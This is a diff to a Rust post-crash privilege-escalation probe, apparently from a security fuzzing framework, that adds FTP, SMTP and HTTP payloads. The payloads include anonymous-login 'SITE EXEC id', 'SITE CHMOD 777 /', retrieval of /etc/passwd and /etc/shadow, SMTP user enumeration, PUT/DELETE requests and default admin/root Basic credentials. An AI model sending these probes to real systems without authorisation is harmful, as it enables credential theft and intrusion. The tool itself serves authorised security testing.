@@ -4,22 +4,23 @@
 //! Purpose     : Protocol-aware post-anomaly privilege / command escalation
 //!               probe. After a crash or interesting event, attempts sequences
 //!               that normally require higher privilege or an authenticated
-//!               state. Covers every model currently supported by Nexsiz.
+//!               elevated state.
+//!
+//! Primary     : FTP, SMTP, HTTP (Phase 1 focus)
+//! Fallback    : generic (minimal)
 //!
 //! Exit 2      : Unauthorized-looking elevated success observed → escalate.
 //! Exit 0      : No escalation signal.
 //! Exit 1      : Operational error.
 //! Exit 3      : Internal timeout budget exhausted.
 //!
-//! Phase 0     : Scaffold + contract compliance + model dispatcher.
-//!               Real escalation heuristics land in Phase 1.
-//!
 //! Design (red-team grade):
 //! - Bounded probe set and wall budget.
 //! - Pure TCP (stdlib only + nxs-lib).
-//! - Model-driven: ftp / smtp / http / dns / mqtt / smb / binary-lp / generic.
-//! - Conservative signals; prefer clear success codes / banners.
+//! - Conservative signals; prefer clear success codes.
 //! - Intrusive category.
+//! - Distinct from auth-bypass: here we try elevated commands / paths
+//!   after an anomaly, not merely unauthenticated entry.
 
 use nxs_lib::{
     args::Args,
@@ -33,9 +34,9 @@ use std::net::TcpStream;
 use std::time::{Duration, Instant};
 
 const NXS_ID: &str = "crash/auth-escalation";
-const NXS_VERSION: &str = "0.1.0";
+const NXS_VERSION: &str = "1.0.0";
 const DEFAULT_TIMEOUT_SECS: u64 = 20;
-const MAX_PROBES: usize = 10;
+const MAX_PROBES: usize = 12;
 
 fn main() {
     let args = Args::parse();
@@ -101,8 +102,6 @@ fn run(args: &Args, meta: &Meta) {
         }
     };
 
-    // Phase 0: dispatcher is live; probes are still light / placeholder.
-    // Phase 1 will replace build_escalation_probes with full heuristics.
     let probes = build_escalation_probes(&model, &payload);
     let mut findings: Vec<String> = Vec::new();
     let mut escalated = false;
@@ -174,81 +173,126 @@ fn finish(
 }
 
 // ---------------------------------------------------------------------------
-// Escalation probe construction (Phase 0 — structure + light probes)
-// Phase 1 will expand each arm with full privilege/command sequences.
+// Escalation probe construction — Phase 1 (FTP / SMTP / HTTP)
 // ---------------------------------------------------------------------------
 
 fn build_escalation_probes(model: &str, original: &[u8]) -> Vec<(String, Vec<u8>)> {
     let mut v = Vec::new();
 
-    // Always keep original as baseline reference.
+    // Baseline reference
     v.push(("original".into(), original.to_vec()));
 
     match model {
-        // -----------------------------------------------------------------
-        // FTP family
-        // -----------------------------------------------------------------
+        // =================================================================
+        // FTP — elevated commands & sensitive paths after anomaly
+        // =================================================================
         "ftp" | "grammar-ftp" | "g-ftp" => {
-            // SITE (often restricted)
+            // SITE family (often restricted to admin)
             v.push((
                 "ftp_site_help".into(),
                 b"USER anonymous\r\nPASS guest\r\nSITE HELP\r\nQUIT\r\n".to_vec(),
             ));
-            // Sensitive path retrieval
+            v.push((
+                "ftp_site_exec".into(),
+                b"USER anonymous\r\nPASS guest\r\nSITE EXEC id\r\nQUIT\r\n".to_vec(),
+            ));
+            v.push((
+                "ftp_site_chmod".into(),
+                b"USER anonymous\r\nPASS guest\r\nSITE CHMOD 777 /\r\nQUIT\r\n".to_vec(),
+            ));
+
+            // Sensitive path retrieval / listing
             v.push((
                 "ftp_retr_passwd".into(),
                 b"USER anonymous\r\nPASS guest\r\nRETR /etc/passwd\r\nQUIT\r\n".to_vec(),
             ));
-            // CWD traversal
             v.push((
-                "ftp_cwd_root".into(),
-                b"USER anonymous\r\nPASS guest\r\nCWD /\r\nCWD ../\r\nPWD\r\nQUIT\r\n".to_vec(),
+                "ftp_retr_shadow".into(),
+                b"USER anonymous\r\nPASS guest\r\nRETR /etc/shadow\r\nQUIT\r\n".to_vec(),
             ));
-            // Append privileged command after original
+            v.push((
+                "ftp_list_root".into(),
+                b"USER anonymous\r\nPASS guest\r\nLIST /\r\nQUIT\r\n".to_vec(),
+            ));
+            v.push((
+                "ftp_list_etc".into(),
+                b"USER anonymous\r\nPASS guest\r\nCWD /etc\r\nLIST\r\nQUIT\r\n".to_vec(),
+            ));
+
+            // Directory traversal / privilege path
+            v.push((
+                "ftp_cwd_traversal".into(),
+                b"USER anonymous\r\nPASS guest\r\nCWD /\r\nCWD ../\r\nCWD ../../\r\nPWD\r\nQUIT\r\n"
+                    .to_vec(),
+            ));
+
+            // After original payload — try elevated follow-up
             if !original.is_empty() {
                 let mut p = original.to_vec();
                 if !p.ends_with(b"\n") {
                     p.extend_from_slice(b"\r\n");
                 }
-                p.extend_from_slice(b"SITE EXEC id\r\nLIST /\r\n");
-                v.push(("ftp_orig_then_site".into(), p));
+                p.extend_from_slice(b"SITE HELP\r\nLIST /\r\nRETR /etc/passwd\r\n");
+                v.push(("ftp_orig_then_elevated".into(), p));
             }
         }
 
-        // -----------------------------------------------------------------
-        // SMTP family
-        // -----------------------------------------------------------------
+        // =================================================================
+        // SMTP — information disclosure & relay / command escalation
+        // =================================================================
         "smtp" | "grammar-smtp" | "g-smtp" => {
+            // Classic info-leak / privilege probes
             v.push((
                 "smtp_vrfy_root".into(),
                 b"EHLO localhost\r\nVRFY root\r\nQUIT\r\n".to_vec(),
             ));
             v.push((
+                "smtp_vrfy_admin".into(),
+                b"EHLO localhost\r\nVRFY admin\r\nQUIT\r\n".to_vec(),
+            ));
+            v.push((
+                "smtp_expn_root".into(),
+                b"EHLO localhost\r\nEXPN root\r\nQUIT\r\n".to_vec(),
+            ));
+            v.push((
                 "smtp_expn_admin".into(),
                 b"EHLO localhost\r\nEXPN admin\r\nQUIT\r\n".to_vec(),
             ));
+
+            // Open-relay / privileged MAIL style
             v.push((
-                "smtp_mail_relay".into(),
-                b"EHLO localhost\r\nMAIL FROM:<root@localhost>\r\nRCPT TO:<postmaster>\r\nDATA\r\n.\r\nQUIT\r\n"
+                "smtp_mail_root".into(),
+                b"EHLO localhost\r\nMAIL FROM:<root@localhost>\r\nRCPT TO:<postmaster>\r\nDATA\r\nSubject: test\r\n\r\ntest\r\n.\r\nQUIT\r\n"
                     .to_vec(),
             ));
+            v.push((
+                "smtp_mail_empty_from".into(),
+                b"EHLO localhost\r\nMAIL FROM:<>\r\nRCPT TO:<postmaster>\r\nQUIT\r\n".to_vec(),
+            ));
+
+            // After original — inject VRFY/EXPN
             if !original.is_empty() {
                 let mut p = original.to_vec();
                 if !p.ends_with(b"\n") {
                     p.extend_from_slice(b"\r\n");
                 }
-                p.extend_from_slice(b"VRFY root\r\nEXPN root\r\n");
+                p.extend_from_slice(b"VRFY root\r\nEXPN root\r\nVRFY admin\r\n");
                 v.push(("smtp_orig_then_vrfy".into(), p));
             }
         }
 
-        // -----------------------------------------------------------------
-        // HTTP family
-        // -----------------------------------------------------------------
+        // =================================================================
+        // HTTP — privileged paths, methods, and header escalation
+        // =================================================================
         "http" | "grammar-http" | "g-http" => {
+            // Common admin / status surfaces
             v.push((
                 "http_admin".into(),
                 b"GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".to_vec(),
+            ));
+            v.push((
+                "http_admin_slash".into(),
+                b"GET /admin/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".to_vec(),
             ));
             v.push((
                 "http_server_status".into(),
@@ -256,110 +300,64 @@ fn build_escalation_probes(model: &str, original: &[u8]) -> Vec<(String, Vec<u8>
                     .to_vec(),
             ));
             v.push((
-                "http_put_test".into(),
-                b"PUT /test.txt HTTP/1.1\r\nHost: localhost\r\nContent-Length: 4\r\nConnection: close\r\n\r\ntest\r\n"
+                "http_server_info".into(),
+                b"GET /server-info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
+                    .to_vec(),
+            ));
+            v.push((
+                "http_manager".into(),
+                b"GET /manager/html HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
+                    .to_vec(),
+            ));
+
+            // Dangerous / elevated methods
+            v.push((
+                "http_put".into(),
+                b"PUT /test_nxs.txt HTTP/1.1\r\nHost: localhost\r\nContent-Length: 4\r\nConnection: close\r\n\r\ntest"
+                    .to_vec(),
+            ));
+            v.push((
+                "http_delete".into(),
+                b"DELETE /test_nxs.txt HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
                     .to_vec(),
             ));
             v.push((
                 "http_options".into(),
                 b"OPTIONS * HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".to_vec(),
             ));
+            v.push((
+                "http_trace".into(),
+                b"TRACE / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".to_vec(),
+            ));
+
+            // Basic auth with common elevated credentials
+            v.push((
+                "http_basic_admin".into(),
+                b"GET /admin HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: close\r\n\r\n"
+                    .to_vec(),
+            ));
+            v.push((
+                "http_basic_root".into(),
+                b"GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic cm9vdDpyb290\r\nConnection: close\r\n\r\n"
+                    .to_vec(),
+            ));
+
             if !original.is_empty() {
                 v.push(("http_original".into(), original.to_vec()));
             }
         }
 
-        // -----------------------------------------------------------------
-        // DNS (limited auth surface; still probe unusual opcodes / TSIG-ish)
-        // -----------------------------------------------------------------
-        "dns" | "grammar-dns" | "g-dns" => {
-            // Phase 0: keep original + a simple additional query pattern.
-            // Real TSIG / UPDATE escalation logic → Phase 1.
-            if !original.is_empty() {
-                v.push(("dns_original".into(), original.to_vec()));
-            }
-            // Minimal additional A query for localhost (safe probe)
-            // (length-prefixed TCP DNS)
-            let q = b"\x00\x1e\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09localhost\x00\x00\x01\x00\x01";
-            v.push(("dns_localhost_a".into(), q.to_vec()));
-        }
-
-        // -----------------------------------------------------------------
-        // MQTT
-        // -----------------------------------------------------------------
-        "mqtt" | "grammar-mqtt" | "g-mqtt" => {
-            // CONNECT with admin-ish credentials + SUBSCRIBE to $SYS
-            // Simplified fixed-header style probes (Phase 1 will refine).
-            v.push((
-                "mqtt_connect_admin".into(),
-                b"\x10\x18\x00\x04MQTT\x04\x02\x00\x3c\x00\x05admin\x00\x05admin".to_vec(),
-            ));
-            if !original.is_empty() {
-                let mut p = original.to_vec();
-                // Append a SUBSCRIBE to $SYS/# (very rough placeholder)
-                p.extend_from_slice(b"\x82\x0b\x00\x01\x00\x06$SYS/#\x00");
-                v.push(("mqtt_orig_then_sys".into(), p));
-            }
-        }
-
-        // -----------------------------------------------------------------
-        // SMB / CIFS
-        // -----------------------------------------------------------------
-        "smb" | "cifs" | "grammar-smb" | "g-smb" => {
-            // Phase 0: keep original + very light negotiate-style probe.
-            // Full Session Setup / Tree Connect escalation → Phase 1.
-            if !original.is_empty() {
-                v.push(("smb_original".into(), original.to_vec()));
-            }
-            // Minimal NetBIOS + SMB negotiate placeholder (will be replaced)
-            v.push((
-                "smb_negotiate_placeholder".into(),
-                b"\x00\x00\x00\x2f\xffSMB\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
-            ));
-        }
-
-        // -----------------------------------------------------------------
-        // Binary length-prefix (BE / LE)
-        // -----------------------------------------------------------------
-        "binary-lp" | "lp" | "binary-lp-le" | "lp-le" => {
-            // Phase 0: original + simple command-like suffixes.
-            if !original.is_empty() {
-                v.push(("binary_original".into(), original.to_vec()));
-            }
-            // Attempt common elevated-looking opcodes / strings
-            v.push(("binary_admin_cmd".into(), b"\x00\x0aADMIN\x00EXEC".to_vec()));
-            v.push(("binary_root_cmd".into(), b"\x00\x08ROOT\x00ID".to_vec()));
-            if !original.is_empty() {
-                let mut p = original.to_vec();
-                p.extend_from_slice(b"\x00\x04PRIV");
-                v.push(("binary_orig_then_priv".into(), p));
-            }
-        }
-
-        // -----------------------------------------------------------------
-        // Generic / fallback
-        // -----------------------------------------------------------------
+        // =================================================================
+        // Fallback (non-target models) — minimal, non-aggressive
+        // =================================================================
         _ => {
             if !original.is_empty() {
                 v.push(("generic_original".into(), original.to_vec()));
             }
-            // Classic auth + privileged command patterns
             v.push((
-                "generic_root_pass".into(),
-                b"USER root\r\nPASS root\r\nID\r\n".to_vec(),
+                "generic_root".into(),
+                b"USER root\r\nPASS root\r\n".to_vec(),
             ));
-            v.push((
-                "generic_admin_basic".into(),
-                b"Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n".to_vec(),
-            ));
-            if !original.is_empty() {
-                let mut p = original.to_vec();
-                if !p.ends_with(b"\n") {
-                    p.extend_from_slice(b"\r\n");
-                }
-                p.extend_from_slice(b"PRIV\r\nADMIN\r\n");
-                v.push(("generic_orig_then_priv".into(), p));
-            }
         }
     }
 
@@ -367,8 +365,7 @@ fn build_escalation_probes(model: &str, original: &[u8]) -> Vec<(String, Vec<u8>
 }
 
 // ---------------------------------------------------------------------------
-// Escalation signal detection (Phase 0 — conservative)
-// Phase 1 will tighten per-protocol success criteria.
+// Escalation signal detection — Phase 1 (tightened for FTP/SMTP/HTTP)
 // ---------------------------------------------------------------------------
 
 fn is_escalation_signal(model: &str, probe_name: &str, outcome: &ProbeOutcome) -> bool {
@@ -379,63 +376,49 @@ fn is_escalation_signal(model: &str, probe_name: &str, outcome: &ProbeOutcome) -
 
     match model {
         "ftp" | "grammar-ftp" | "g-ftp" => {
-            // 200/250 after SITE / RETR / privileged CWD is interesting
+            // 200 = Command okay, 250 = Requested file action okay,
+            // 257 = PATHNAME created / PWD reply
             if probe_name.contains("site")
                 || probe_name.contains("retr")
+                || probe_name.contains("list")
                 || probe_name.contains("cwd")
+                || probe_name.contains("elevated")
             {
                 return codes.iter().any(|c| matches!(*c, 200 | 250 | 257));
             }
             false
         }
         "smtp" | "grammar-smtp" | "g-smtp" => {
-            // 250/252 on VRFY/EXPN/MAIL can indicate weak config
+            // 250 = Requested mail action okay, 252 = Cannot VRFY but will attempt
             if probe_name.contains("vrfy")
                 || probe_name.contains("expn")
                 || probe_name.contains("mail")
-                || probe_name.contains("relay")
             {
                 return codes.iter().any(|c| matches!(*c, 250 | 252));
             }
             false
         }
         "http" | "grammar-http" | "g-http" => {
-            // 200/204 on admin / server-status / PUT is elevated signal
             if probe_name.contains("admin")
                 || probe_name.contains("status")
+                || probe_name.contains("info")
+                || probe_name.contains("manager")
                 || probe_name.contains("put")
+                || probe_name.contains("delete")
+                || probe_name.contains("basic")
             {
                 return codes
                     .iter()
-                    .any(|c| matches!(*c, 200 | 204 | 201 | 301 | 302));
+                    .any(|c| matches!(*c, 200 | 201 | 204 | 301 | 302 | 307));
+            }
+            if probe_name.contains("options") || probe_name.contains("trace") {
+                return codes.iter().any(|c| *c == 200);
             }
             false
         }
-        "mqtt" | "grammar-mqtt" | "g-mqtt" => {
-            // CONNACK success (rough) or any clear success code
-            // Phase 1 will parse MQTT properly.
-            codes.iter().any(|c| *c == 0 || *c == 200)
-                || outcome.detail.contains("recv") && probe_name.contains("admin")
-        }
-        "dns" | "grammar-dns" | "g-dns" => {
-            // Phase 0: almost never escalate on DNS alone
-            false
-        }
-        "smb" | "cifs" | "grammar-smb" | "g-smb" => {
-            // Phase 0 placeholder — no strong signal yet
-            false
-        }
-        "binary-lp" | "lp" | "binary-lp-le" | "lp-le" => {
-            // Any clear 2xx-style or success banner after priv command
-            codes.iter().any(|c| matches!(*c, 200 | 230 | 250))
-        }
         _ => {
-            // Generic: elevated-looking success codes after priv probes
-            if probe_name.contains("root")
-                || probe_name.contains("admin")
-                || probe_name.contains("priv")
-            {
-                return codes.iter().any(|c| matches!(*c, 200 | 230 | 250 | 257));
+            if probe_name.contains("root") || probe_name.contains("admin") {
+                return codes.iter().any(|c| matches!(*c, 200 | 230 | 250));
             }
             false
         }
@@ -443,7 +426,7 @@ fn is_escalation_signal(model: &str, probe_name: &str, outcome: &ProbeOutcome) -
 }
 
 // ---------------------------------------------------------------------------
-// Probe engine (shared with auth-bypass style)
+// Probe engine
 // ---------------------------------------------------------------------------
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -631,7 +614,7 @@ fn print_help() {
         r#"nxs-auth-escalation {ver} (id={id})
 
 Protocol-aware post-anomaly privilege / command escalation probe.
-Covers all Nexsiz models: ftp, smtp, http, dns, mqtt, smb, binary-lp, generic.
+Primary targets: FTP, SMTP, HTTP.
 
 USAGE:
     nxs-auth-escalation --crash <path> --target <host:port> [OPTIONS]
@@ -641,7 +624,7 @@ GLOBAL OPTIONS (contract):
     --crash <path>         Input that caused the event
     --target <host:port>   Live target
     --event <type>         crash | …
-    --model <name>         Protocol model (ftp|smtp|http|dns|mqtt|smb|binary-lp|generic)
+    --model <name>         Protocol model (ftp|smtp|http|…)
     --minimized <path>     Prefer as baseline
     --meta <path>          Nexsiz metadata JSON
     --out <dir>            report.json
@@ -656,8 +639,8 @@ EXIT CODES:
     2  Escalation signal observed → escalate
     3  Internal timeout budget exhausted
 
-NOTE: Intrusive — contacts the live target multiple times with privilege probes.
-Phase 0 scaffold; full heuristics arrive in Phase 1.
+NOTE: Intrusive — contacts the live target with privilege / elevated probes.
+Distinct from auth-bypass: focuses on elevated commands and paths after anomaly.
 "#,
         ver = NXS_VERSION,
         id = NXS_ID,
